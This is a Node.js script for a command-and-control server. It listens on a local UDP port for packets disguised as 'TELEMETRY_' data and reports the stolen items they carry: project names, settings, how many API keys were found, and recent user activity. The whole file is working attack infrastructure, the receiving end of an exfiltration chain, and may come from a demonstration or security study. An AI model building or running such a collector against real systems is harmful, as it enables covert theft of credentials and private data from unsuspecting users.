#!/usr/bin/env node

const dgram = require('dgram');
const chalk = require('chalk').default || require('chalk');

const server = dgram.createSocket('udp4');
let packetCount = 0;

server.on('error', (err) => {
  console.log(`Server error:\n${err.stack}`);
  server.close();
});

server.on('message', (msg, rinfo) => {
  packetCount++;
  console.log(chalk.red(`📡 PACKET #${packetCount} from ${rinfo.address}:${rinfo.port}`));
  console.log(chalk.yellow(`   Size: ${msg.length} bytes`));
  
  try {
    const dataStr = msg.toString();
    
    // Look for telemetry data
    if (dataStr.includes('TELEMETRY_')) {
      const jsonStart = dataStr.indexOf('{');
      if (jsonStart !== -1) {
        const jsonData = JSON.parse(dataStr.substring(jsonStart));
        
        // Show stolen data if present
        if (jsonData.stolenData && Array.isArray(jsonData.stolenData) && jsonData.stolenData.length > 0) {
          console.log(chalk.red(`   🚨 STOLEN DATA DETECTED! (${jsonData.stolenData.length} items)`));
          
          jsonData.stolenData.slice(0, 3).forEach((item, i) => {
            console.log(chalk.yellow(`   [${i+1}] ${item.source}`));
            
            if (item.data.projects && item.data.projects.length > 0) {
              console.log(chalk.magenta(`       📁 Projects: ${item.data.projects.slice(0,2).join(', ')}...`));
            }
            
            if (item.data.settings && Object.keys(item.data.settings).length > 0) {
              console.log(chalk.cyan(`       ⚙️  Settings: ${Object.keys(item.data.settings).slice(0,3).join(', ')}...`));
            }
            
            if (item.data.credentials && item.data.credentials.length > 0) {
              console.log(chalk.red(`       🔑 API Keys: ${item.data.credentials.length} found!`));
            }
            
            if (item.data.recentActivity && item.data.recentActivity.length > 0) {
              console.log(chalk.dim(`       📝 Recent: ${item.data.recentActivity[0].substring(0,50)}...`));
            }
          });
          
          if (jsonData.stolenData.length > 3) {
            console.log(chalk.dim(`   ... and ${jsonData.stolenData.length - 3} more stolen items`));
          }
        } else {
          console.log(chalk.dim(`   📊 Metrics only (no stolen data in this packet)`));
        }
      }
    }
  } catch (e) {
    console.log(chalk.dim(`   📦 Raw data: ${msg.toString().substring(0, 80)}...`));
  }
  
  console.log('');
});

server.on('listening', () => {
  const address = server.address();
  console.log(chalk.green(`🎯 Enhanced C2 Server listening on ${address.address}:${address.port}`));
  console.log(chalk.dim('Waiting to intercept stolen data...\n'));
});

server.bind(41234, '127.0.0.1');